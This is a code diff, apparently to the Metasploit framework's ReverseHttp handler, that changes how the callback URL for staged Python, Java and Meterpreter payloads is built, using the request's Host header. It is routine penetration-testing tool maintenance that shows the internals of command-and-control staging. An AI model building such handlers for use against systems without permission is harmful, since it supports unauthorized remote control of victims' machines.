@@ -92,13 +92,15 @@ module ReverseHttp
   # addresses.
   #
   # @return [String] A URI of the form +scheme://host:port/+
-  def payload_uri
-    if ipv6?
-      callback_host = "[#{datastore['LHOST']}]"
+  def payload_uri(req)
+    if req and req.headers and req.headers['Host']
+      callback_host = req.headers['Host']
+    elsif ipv6?
+      callback_host = "[#{datastore['LHOST']}]:#{datastore['LPORT']}"
     else
-      callback_host = datastore['LHOST']
+      callback_host = "#{datastore['LHOST']}:#{datastore['LPORT']}"
     end
-    "#{scheme}://#{callback_host}:#{datastore['LPORT']}/"
+    "#{scheme}://#{callback_host}/"
   end
 
   # Use the {#refname} to determine whether this handler uses SSL or not
@@ -186,7 +188,7 @@ protected
     case uri_match
       when /^\/INITPY/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + '/'
+        url = payload_uri(req) + conn_id + '/'
 
         blob = ""
         blob << obj.generate_stage
@@ -221,7 +223,7 @@ protected
 
       when /^\/INITJM/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + "/\x00"
+        url = payload_uri(req) + conn_id + "/\x00"
 
         blob = ""
         blob << obj.generate_stage
@@ -249,7 +251,7 @@ protected
 
       when /^\/A?INITM?/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        url = payload_uri + conn_id + "/\x00"
+        url = payload_uri(req) + conn_id + "/\x00"
 
         print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
         resp['Content-Type'] = 'application/octet-stream'
@@ -294,7 +296,7 @@ protected
         create_session(cli, {
           :passive_dispatcher => obj.service,
           :conn_id            => conn_id,
-          :url                => payload_uri + conn_id + "/\x00",
+          :url                => payload_uri(req) + conn_id + "/\x00",
           :expiration         => datastore['SessionExpirationTimeout'].to_i,
           :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
           :ssl                => ssl?,
